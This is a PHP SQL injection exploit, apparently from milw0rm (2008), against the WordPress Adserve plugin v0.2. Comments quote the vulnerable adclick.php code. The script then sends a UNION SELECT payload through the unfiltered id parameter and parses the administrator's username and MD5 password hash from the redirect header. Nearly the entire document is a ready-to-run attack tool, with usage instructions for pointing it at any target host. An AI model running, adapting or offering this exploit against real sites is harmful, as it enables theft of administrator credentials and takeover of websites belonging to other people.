<?
# WordPress Adserve plugin v 0.2 Sql Injection Exploit 
#
# Plugin Homepage-http://www.irisco.it/?page_id=40
# 	
# Found by:enter_the_dragon
# 

# Vuln code
#
# -In adclick.php
#
# if (isset($_GET['id'])) {
#    Header("Location: ".iri_AdServe_BannerClick($_GET['id'])
#	
# -In  iri_AdServe_BannerClick function
#   
# 	return $wpdb->get_var("SELECT url FROM $table_name WHERE id=$id;");  
#
#
# 

# Exploit
# 
# id variable isnt filtered so we can inject and check the output in the Location response-header 
# If exploit is succesfull Wordpress administrators login and md5 hashed password is retrieved
#
# 




echo "\n";
echo "-------WordPress Adserve plugin v 0.2 Sql Injection Exploit-------"."\n";
echo "-------------------coded by : enter_the_dragon--------------------"."\n";
echo "------------------------------------------------------------------"."\n";
if ($argc!=3)
{
echo " Usage:	$argv[0] target_host wp_path \n";
echo " target_host:	Your target ex www.target.com \n";
echo " wp_path:	WordPress path ex /blog/ or / if wordpress is installed in the web servers root folder";	     
echo "\n";
exit;
}


$query=$argv[1];
$query.=$argv[2];
$query.="wp-content/plugins/wp-adserve/adclick.php?";
$query.="id=-1%20union%20select%20concat(0x7c,user_login,0x7c,user_pass,0x7c)%20from%20wp_users";

  
if(function_exists(curl_init))
{
  $ch = curl_init("http://$query");
  curl_setopt($ch, CURLOPT_HEADER,true);
  curl_setopt( $ch, CURLOPT_RETURNTRANSFER,true);
  curl_setopt($ch, CURLOPT_TIMEOUT,10);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)");  
  $html=curl_exec($ch);
  $returncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
  curl_close($ch);

  if($returncode==302)
     {  
	$pattern="/\|(.*)?\|([a-z0-9]{32})\|/";
        if(preg_match($pattern,$html,$matches))
          {
           $adminusername=$matches[1];
           $adminpass=$matches[2];
	   echo "Admin Login:$adminusername\n" ;
     	   echo "Admin Pass :$adminpass\n";	    
	  }
     }		    
	else 
     {
	exit ("Exploit Failed :( \n");
     }	


}
else
exit("Error:Libcurl isnt installed \n");

?>

# milw0rm.com [2008-01-30]
